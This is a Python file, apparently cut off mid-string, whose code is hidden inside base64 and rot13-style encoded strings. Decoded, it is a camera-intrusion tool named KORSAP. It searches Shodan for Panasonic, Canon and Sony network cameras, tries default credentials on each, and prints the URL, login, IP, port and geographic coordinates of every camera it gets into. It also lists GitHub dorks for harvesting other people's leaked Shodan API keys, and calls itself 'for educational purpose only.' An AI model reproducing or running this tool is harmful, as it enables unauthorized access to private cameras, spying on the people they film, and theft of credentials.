# Python code obfuscated by @imhunterand


import base64, codecs
magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KCiMgQXV0aG9yOiAgIEFORFJJIEhVIChERUIwQ09OKSA8aW1odW50ZXJhbmRAY3liZXJzZXJ2aWNlcy5jb20+CiMgTGljZW5zZTogIE1JVCBMaWNlbnNlIChodHRwOi8vd3d3Lm9wZW5zb3VyY2Uub3JnL2xpY2Vuc2VzL21pdC1saWNlbnNlLnBocCkKIyBEb2NzOiAgICAgaHR0cHM6Ly9naXRodWIuY29tL2ltaHVudGVyYW5kL0tPUlNBUAojIFdlYnNpdGU6ICBodHRwOi8vc2FteS5saW5rLwojIE5vdGU6ICAgICBGT1IgRURVQ0FUSU9OQUwgUFVSUE9TRSBPTkxZLgoKZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBwcmludF9mdW5jdGlvbiwgdW5pY29kZV9saXRlcmFscwpmcm9tIFB5SW5xdWlyZXIgaW1wb3J0IFNlcGFyYXRvciwgVG9rZW4sIHByb21wdCwgc3R5bGVfZnJvbV9kaWN0CmZyb20gdGVybWNvbG9yIGltcG9ydCBjcHJpbnQKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzaG9kYW4KaW1wb3J0IGJhc2U2NAppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCmltcG9ydCBjc3YKaW1wb3J0IG9zCgpkZWYgYmFubmVyKCk6CiAga29yU2FwID0gIiIiCgrilojiloTiloDigIPilojiloDilojigIPilojiloDilojigIPilojiloDigIPiloTiloDilojigIPilojiloDiloggICBbfCAgIHw9fHspX18gICAgICAgIOKWhOKWiOKWgOKUgOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKUgOKWgOKWiOKWhCAgICAK4paI4paR4paI4oCD4paI4paE4paI4oCD4paI4paA4paE4oCD4paE4paI4oCD4paI4paA4paI4oCD4paI4paA4paAICAgIHxfX198IFwvICAgKSAgICAgICDiloDilojilojilojilojilojilojilojilojilojilojilojilojilojiloAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgIC98XCAgICAgIC98ICAgICAgICAgICDilojiloTilojilojilojiloTiloggICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAvIHwgXCAgICAgfCBcXCAgICAgICAgICAg4paI4paA4paI4paA4paIICAgICAK4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA8J+EuvCfhL7wn4WB8J+FgvCfhLDwn4S/4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACktPUlNBUCBJUyBVU0VEIEFTIEEgVE9PTCBPRiBFWFBMT0lUQVRJT04gVE8gSEFWRSBPUiBWSUEgQ0FNRVJBIExPR0lOIEFDQ0VTUyAoS09SVVBUT1IgU0FEQVApCgogICAgICAgICAgICAgICAgICAgICAgICAgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWS4gICAKICAiIiIKICB0eHRDb2xvcnMgPSBbJ3JlZCcsICdncmVlbicsICdjeWFuJywgJ3llbGxvdycsICdibHVlJywgJ21hZ2VudGEnXQogIHJldHVybiBjcHJpbnQoa29yU2FwLCByYW5kb20uY2hvaWNlKHR4dENvbG9ycyksIGF0dHJzPVsnYm9sZCddKQoKZGVmIGdldFNhdmVkQVBJS2V5KCk6CiAgZmlsZW5hbWUgPSAnc2hvZGFuX2tleS50eHQnCiAgZmlsZV9leGlzdHMgPSBvcy5wYXRoLmlzZmlsZShmaWxlbmFtZSkgCiAgaWYgZmlsZV9leGlzdHM6CiAgICByZXR1cm4gb3BlbihmaWxlbmFtZSwgJ3InKS5yZWFkKCkKICBlbHNlOgogICAgcmV0dXJuIG9wZW4oZmlsZW5hbWUsICd3KycpLnJlYWQoKQoKZGVmIGNoZWNrU2hvZGFuQVBJS2V5KGFwaUtleSk6CiAgdHJ5OgogICAgcHJpbnQoJ1vij7NdIE1lbWVyaWtzYSBhcGFrYWgga3VuY2kgU2hvZGFuIEFQSSB2YWxpZC4uLicpCiAgICBhcGkgPSBzaG9kYW4uU2hvZGFuKGFwaUtleSkKICAgIGFwaS5zZWFyY2goJzBfMCcpCiAgICBjcHJpbnQoJ1vinJTvuI9dIE90ZW50aWthc2kgS3VuY2kgQVBJOiBTVUtTRVMuLiEnLCAnZ3JlZW4nLCBhdHRycz1bJ2JvbGQnXSkKICAgIHNhdmVBUElLZXkoYXBpS2V5KQogICAgY3ByaW50KCdb8J+TkV0gS3VuY2kgQVBJIHRlbGFoIGRpc2ltcGFuLlxuJywgJ2JsdWUnLCBhdHRycz1bJ2JvbGQnXSkKICAgIHJldHVybiBhcGlLZXkKICBleGNlcHQgc2hvZGFuLkFQSUVycm9yIGFzIGVycm9yTWVzc2FnZToKICAgIGNwcmludCgnW/CfmqtdIEVycm9yOiB7fS4gTW9ob24sIGNvYmEgbGFnaS4nLmZvcm1hdChlcnJvck1lc3NhZ2UpLCAncmVkJywgYXR0cnM9Wydib2xkJ10pCiAgICBleGl0KCkKCmRlZiBmaW5kU2hvZGRhbkFQSUtleU9uR2l0KGJvb2xlYW4pOgogIGlmIGJvb2xlYW4gPT0gVHJ1ZToKICAgIGNwcmludCgnW/CfkbtdIEJlcmlrdXQgYWRhbGFoIGRhZnRhciBkb3JrcyBHaXRIdWIgdW50dWsgbWVtYmFudHUgQW5kYSBtZW5lbXVrYW4gS3VuY2kgQVBJIFNob2RhbicsICdncmVlbicsIGF0dHJzPVsnYm9sZCddKQogICAgcHJpbnQoJ1srXSBcMDMzWzE7MzJtIERvcmsgMTpcMDMzWzE7bSBzaG9kYW5fYXBpX2tleSBsYW5ndWFnZTpweXRob24nKQogICAgcHJpbnQoJ1srXSBcMDMzWzE7MzJtIERvcmsgMjpcMDMzWzE7bSBzaG9kYW5fYXBpX2tleSBsYW5ndWFnZTpwaHAnKQogICAgcHJpbnQoJ1srXSBcMDMzWzE7MzJtIERvcmsgMzpcMDMzWzE7bSBzaG9kYW5fYXBpX2tleSBsYW5ndWFnZTpqYXZhc2NyaXB0JykKICAgIHByaW50KCdbK10gXDAzM1sxOzMybSBEb3JrIDQ6XDAzM1sxO20gc2hvZGFuX2tleSBsYW5ndWFnZTpweXRob24nKQogICAgcHJpbnQoJ1srXSBcMDMzWzE7MzJtIERvcmsgNTpcMDMzWzE7bSBzaG9kYW5fa2V5IGxhbmd1YWdlOnBocCcpCiAgICBwcmludCgnWytdIFwwMzNbMTszMm0gRG9yayA2OlwwMzNbMTttIHNob2Rhbl9rZXkgbGFuZ3VhZ2U6amF2YXNjcmlwdCcpCiAgICBjcHJpbnQoJ1vwn5GAXSBNYXN1a2thbiBkb3JrcyBiZXJpa3V0IGRpIGJpbGFoIHBlbmNhcmlhbiBHaXRIdWIsIHBpbGloIHRhYiAiQ29kZSIsIGRhbiBwZXJoYXRpa2FuIGJhaWstYmFpayBrdW5jaSBTaG9kYW4gQVBJIGRhbGFtIGtvZGUuJywgJ2dyZWVuJywgYXR0cnM9Wydib2xkJ10pCiAgICBjcHJpbnQoJ1vinI/vuI9dIEFuZGEganVnYSBkYXBhdCBtZW1vZGlmaWthc2kgZG9ya3MgZGVuZ2FuIG1lbmd1YmFoIGJhaGFzYSBtaXNhbG55YSB1bnR1ayBtZW5kYXBhdGthbiBsZWJpaCBiYW55YWsgaGFzaWwuJywgJ2dyZWVuJywgYXR0cnM9Wydib2xkJ10pCiAgcHJpbnQoJ1xuW/CfkbldIFNhbXBhaSBqdW1wYSBkaSBwZXR1YWxhbmdhbiBiYXJ1IVxuJykgIAogIGV4aXQoKQoKZGVmIHNob2RhblNlYXJjaChhcGlLZXksIHBhcmFtcyk6CiAgdHJ5OiAgICAKICAgIGFwaSA9IHNob2Rhbi5TaG9kYW4oYXBpS2V5KQogICAgcXVlcnkgPSBnZXRDYW1lcmFEb3JrKHBhcmFtc1sna2V5d29yZHMnXSkKCiAgICBpZiBwYXJhbXNbJ2NvdW50cnknXSAhPSAnYWxsJzoKICAgICAgcXVlcnkgPSAne30gY291bnRyeToie30iJy5mb3JtYXQocXVlcnksIHBhcmFtc1snY291bnRyeSddKQoKICAgIGNwcmludCgnWy9dIFBlbmVsaXRpYW4ga2FtZXJhIHRlbGFoIGRpbXVsYWkuIE11bmdraW4gYnV0dWggYmViZXJhcGEgc2FhdCwgaGFyYXAgYmVyc2FiYXIuXG4nLCAneWVsbG93JywgYXR0cnM9Wydib2xkJ10pCiAgICByZXN1bHRzID0gW10KICAgIGNvdW50ZXIgPSAxCiAgICBuYkNhbWVyYVRlc3RlZCA9IDEKICAgIGZvciByZXNwb25zZSBpbiBhcGkuc2VhcmNoX2N1cnNvcihxdWVyeSk6CiAgICAgIGNhbWVyYU5hbWUgPSBkZXRlY3RDYW1lcmFUeXBlKHJlc3BvbnNlWydodHRwJ11bJ3RpdGxlJ10pCiAgICAgIGlmIGNhbWVyYU5hbWUgIT0gRmFsc2U6CiAgICAgICAgY2FtZXJhRGF0YSA9IGdsb2JhbHMoKVtjYW1lcmFOYW1lKydDdXJsJ10ocmVzcG9uc2UpCiAgICAgICAgaWYgY2FtZXJhRGF0YSAhPSBGYWxzZToKICAgICAgICAgIGNhbWVyYURhdGFbJ2NhbWVyYU5hbWUnXSA9IGNhbWVyYU5hbWUKICAgICAgICAgIHByaW50KCdbK10gXDAzM1sxOzMybSBVUkw6XDAzM1sxO20ge30nLmZvcm1hdCgoY2FtZXJhRGF0YVsndXJsJ10pKSkKICAgICAgICAgIHByaW50KCdbK10gXDAzM1sxOzMybSBDcmVkZW50aWFsczpcMDMzWzE7bSB7fScuZm9ybWF0KChjYW1lcmFEYXRhWydjcmVkZW50aWFscyddKSkpCiAgICAgICAgICBwcmludCgnWytdIFwwMzNbMTszMm0gSVA6XDAzM1sxO20ge30nLmZvcm1hdCgoY2FtZXJhRGF0YVsnaXBfc3RyJ10pKSkKICAgICAgICAgIHByaW50KCdbK10gXDAzM1sxOzMybSBQb3J0OlwwMzNbMTttIHt9Jy5mb3JtYXQoc3RyKGNhbWVyYURhdGFbJ3BvcnQnXSkpKQogICAgICAgICAgcHJpbnQoJ1srXSBcMDMzWzE7MzJtIENhbWVyYSB0eXBlOlwwMzNbMTttIHt9IHwge30nLmZvcm1hdChjYW1lcmFEYXRhWydjYW1lcmFOYW1lJ10sIHN0cihjYW1lcmFEYXRhWydodHRwJ11bJ3RpdGxlJ10pKSkKICAgICAgICAgIHByaW50KCdbK10gXDAzM1sxOzMybSBMYXRpdHVkZTpcMDMzWzE7bSB7fScuZm9ybWF0KHN0cihjYW1lcmFEYXRhWydsb2NhdGlvbiddWydsYXRpdHVkZSddKSkpCiAgICAgICAgICBwcmludCgnWytdIFwwMzNbMTszMm0gTG9uZ2l0dWRlOlwwMzNbMTttIHt9Jy5mb3JtYXQoc3RyKGNhbWVyYURhdGFbJ2xvY2F0aW9uJ11bJ2xvbmdpdHVkZSddKSkpCiAgICAgICAgICBwcmludCgnWytdIFwwMzNbMTszMm0gQ2l0eTpcMDMzWzE7bSB7fScuZm9ybWF0KHN0cihjYW1lcmFEYXRhWydsb2NhdGlvbiddWydjaXR5J10pKSkKICAgICAgICAgIHByaW50KCdbK10gXDAzM1sxOzMybSBDb3VudHJ5OlwwMzNbMTttIHt9Jy5mb3JtYXQoc3RyKGNhbWVyYURhdGFbJ2xvY2F0aW9uJ11bJ2NvdW50cnlfbmFtZSddKSkpCgogICAgICAgICAgcHJpbnQoJ1xuW/Cfkb5dIFwwMzNbMTszMm0gUmVzdWx0OlwwMzNbMTttIHt9LiBcMDMzWzE7MzJtIFNlYXJjaCBxdWVyeTpcMDMzWzE7bSB7fScuZm9ybWF0KHN0cihjb3VudGVyKSwgc3RyKHF1ZXJ5KSkpCiAgICAgICAgICByZXN1bHRzLmFwcGVuZChjYW1lcmFEYXRhKSAKICAgICAgICAgIHByaW50KCdcbicpCiAgICAgICAgICBjb3VudGVyICs9IDEKCiAgICAgIG5iQ2FtZXJhVGVzdGVkICs9MSAgICAKICAgICAgaWYobmJDYW1lcmFUZXN0ZWQgJSAxNSA9PSAwKToKICAgICAgICBjcHJpbnQoJ1svXSBUb3RhbCBjYW1lcmFzIHRlc3RlZDoge31cbicuZm9ybWF0KG5iQ2FtZXJhVGVzdGVkKSwgJ3llbGxvdycsIGF0dHJzPVsnYm9sZCddKQoKICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgIGlmIGNvdW50ZXIgPj0gOTk5OgogICAgICAgIGJyZWFrCiAgICByZXR1cm4gcmVzdWx0cwogIGV4Y2VwdCBzaG9kYW4uQVBJRXJyb3IgYXMgZXJyb3JNZXNzYWdlOgogICAgY3ByaW50KCdb8J+aq10gRXJyb3I6IHt9LiBNb2hvbiwgY29iYSBrZW1iYWxpLicuZm9ybWF0KGVycm9yTWVzc2FnZSksICdyZWQnLCBhdHRycz1bJ2JvbGQnXSkKCgpkZWYgZGV0ZWN0Q2FtZXJhVHlwZSh0aXRsZSk6CiAgIyBGaXJzdCB3ZSBjaGVjayBpZiBpdCdzIGEgUGFuYXNvbmljIGNhbWVyYQogICMgRXg6IFdWLVNXMzE2Li4uCiAgdGl0bGUgPSB0aXRsZS5sb3dlcigpCiAgaWYgdGl0bGVbMl0gPT0gJy0nOgogICAgcmV0dXJuICdwYW5hc29uaWMnCiAgZWxpZiB0aXRsZS5maW5kKCduZXR3b3JrIGNhbWVyYSB2Yi0nKSA9PSBUcnVlOgogICAgcmV0dXJuICdjYW5vbicKICBlbGlmIHRpdGxlID09ICdzb255IG5ldHdvcmsgY2FtZXJhJzoKICAgIHJldHVybiAnc29ueScKICBlbHNlOgogICAgcmV0dXJuIEZhbHNlCgpkZWYgZ2V0Q2FtZXJhRG9yayhuYW1lKToKICBuYW1lID0gbmFtZS5sb3dlcigpCiAgaWYgbmFtZSA9PSAncGFuYXNvbmljJzoKICAgIHJldHVybiAndGl0bGU6Im5ldHdvcm'
love = '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'
